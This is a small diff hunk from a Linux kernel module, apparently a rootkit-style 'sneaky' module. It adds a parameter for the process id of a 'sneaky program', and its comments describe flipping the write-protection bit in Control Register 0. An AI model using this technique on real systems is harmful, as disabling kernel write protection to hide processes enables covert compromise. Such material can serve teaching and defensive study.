@@ -9,6 +9,10 @@
 #include <linux/module.h> // for all modules
 #include <linux/sched.h>
 
+static int pid;
+module_param(pid, int, 0);
+MODULE_PARM_DESC(pid, "The process id of sneaky program");
+
 // Macros for kernel functions to alter Control Register 0 (CR0)
 // This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 // Bit 0 is the WP-bit (write protection). We want to flip this to 0
